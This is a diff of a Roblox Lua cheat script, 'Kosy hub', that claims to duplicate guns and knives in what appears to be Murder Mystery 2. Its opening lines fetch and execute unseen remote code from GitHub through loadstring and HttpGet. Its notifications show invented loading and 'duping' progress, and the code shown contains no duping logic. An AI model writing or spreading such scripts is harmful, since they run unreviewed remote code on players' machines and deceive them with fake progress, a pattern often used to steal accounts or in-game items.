@@ -1,18 +1,15 @@
 getgenv().gui = false
-
 loadstring(game:HttpGet("https://raw.githubusercontent.com/trdrock/mm2/main/Hub"))()
-
-
-
-
 local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
 local Window = OrionLib:MakeWindow({Name = "Kosy hub [3.5]-Summer Update„", HidePremium = false, IntroText = "Kosy hub", IntroIcon = "rbxassetid://18170549235", Icon = "rbxassetid://18170549235", SaveConfig = true, ConfigFolder = "OrionTest"})
 OrionLib:MakeNotification({
 	Name = "Loading Script...",
 	Content = "Script will be loaded in 1-30 seconds | Note - Seconds Shown Here are not the exact loading time",
 	Image = "rbxassetid://18170549235",
-	Time = 5
+	Time = 2
 })
+
+
 --[[
 Name = <string> - The name of the UI.
 HidePremium = <bool> - Whether or not the user details shows Premium status or not.
@@ -33,7 +30,7 @@ OrionLib:MakeNotification({
 	Name = "Script Successfully Loaded",
 	Content = "Loading Has been successful ",
 	Image = "rbxassetid://17849312358",
-	Time = 10
+	Time = 2
 })
 
 --[[
@@ -55,7 +52,7 @@ Tab:AddButton({
 	Name = "Gun Selected ",
 	Content = "The Equipped-Gun Has Been Successfully Selected",
 	Image = "rbxassetid://4483345998",
-	Time = 25
+	Time = 5
 })
 
 --[[
@@ -74,7 +71,7 @@ OrionLib:MakeNotification({
 	Name = "Duping Guns...",
 	Content = "Duping is in process-[Takes around 1-5 minutes]-Depending on your device!",
 	Image = "rbxassetid://4483345998",
-	Time = 25
+	Time = 5
 })
 OrionLib:MakeNotification({
 	Name = "Read-[]",
@@ -115,7 +112,7 @@ Tab:AddButton({
 	Name = "Selected Equipped Knife",
 	Content = "The Equipped-Knife Successfully Selected",
 	Image = "rbxassetid://4483345998",
-	Time = 10
+	Time = 5
 })
 
 --[[
